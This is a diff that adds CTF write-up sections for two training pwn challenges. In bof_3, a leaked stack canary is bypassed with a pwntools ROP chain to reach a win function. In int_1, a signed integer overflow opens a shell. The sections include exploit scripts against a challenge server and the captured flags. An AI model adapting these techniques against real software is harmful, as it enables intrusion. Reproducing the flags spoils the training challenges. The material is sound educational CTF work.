@@ -550,3 +550,147 @@ p.interactive()
 Flag: `BKSEC{2-->upgr4d3\xBuffer\xOv3rfl0w\x1s\xn0t\xC00l\xhixxxxxxxxxxx}`  
 
 Refers to this Gemini chat: `https://gemini.google.com/share/1c614a9c1c42`
+
+## bof_3
+```bash
+$ file bof_3
+bof_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1321e18dfd3016f10564ab4b7707bf538d5f597a, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+$ pwn checksec bof_3
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/bof_3/bof_3'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Idk why but Cutter is better than Ghidra or IDA when solving pwn problem. Better use it.
+
+Disassembly by Cutter:
+
+![alt text](image-4.png)
+
+This problem have a bof with canary vuln. Luckily we have been given the canary. So we need to bypass it.
+
+```py
+from pwn import *
+
+# p = process("./bof_3")
+p = remote("103.77.175.40", 6021)
+
+p.recvuntil(b"My favorite canary is: ")
+canary = int(p.recvline()[:-1].decode("utf-8"), 0)
+print(hex(canary))
+
+to_canary_offset = 0x68 - 0x10
+canary_to_rsp_offset = 0x10 - 8
+win_addr = 0x0000000000401213
+ret_gadget = 0x000000000040101A
+pop_rdi_ret = 0x0000000000401205
+pop_rsi_ret = 0x000000000040120E
+
+
+# Because we need 8 bytes padding to go to rsp.
+# So i added b'A'*8. I stuck here a while.
+# 1 byte = 8 bit => 8 bytes = 64 bits.
+payload = b"A" * to_canary_offset + p64(canary) + b"A" * canary_to_rsp_offset
+payload += p64(pop_rdi_ret) + p64(0xDEADBEEFDEADBEEF)
+payload += p64(pop_rsi_ret) + p64(0xDEADBEEFDEADBEEF)
+payload += p64(ret_gadget) + p64(win_addr)
+
+p.sendline(payload)
+p.interactive()
+```
+
+Flag: `BKSEC{W3_4LL_Hat3_tH4_d4mn_c4NARY}`.
+
+![alt text](image-5.png)
+
+## int_1
+Basic file information:
+
+```bash
+$ file int_1
+int_1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f200e5bb10bc777e114e8de0418256012f6dabdd, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+$ pwn checksec int_1
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/int_1/int_1'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+`main()` decompile by IDA Pro:
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-14h] BYREF
+  int v5; // [rsp+10h] [rbp-10h] BYREF
+  int v6; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v7; // [rsp+18h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  printf("Enter the first positive number: ");
+  __isoc99_scanf("%d", &v4);
+  if ( v4 >= 0 )
+  {
+    printf("Enter the second positive number: ");
+    __isoc99_scanf("%d", &v5);
+    if ( v5 >= 0 )
+    {
+      puts("=====================================");
+      puts("I would try to sum these two numbers!");
+      puts("=====================================");
+      v6 = v4 + v5;
+      printf("Our answer is  %d\n", v4 + v5);
+      if ( v6 >= 0 )
+      {
+        puts("Your sum is not negative, great!");
+      }
+      else
+      {
+        puts("Hmm something is wrong with this calculator");
+        system("/bin/sh");
+      }
+      return 0;
+    }
+    else
+    {
+      puts("Second number cannot be negative.");
+      return 1;
+    }
+  }
+  else
+  {
+    puts("First number cannot be negative.");
+    return 1;
+  }
+}
+```
+
+A simple integer overflow challenge. Because I'm unemployed so I write a python script to solve this.
+
+```py
+from pwn import *
+
+p = remote("103.77.175.40", 6051)
+
+payload = b"2147483647"
+p.sendline(payload)
+p.sendline(payload)
+p.interactive()
+```
+
+Flag: `BKSEC{maTh_1s_7hE_woR57_thIn6_EveRrr}`.
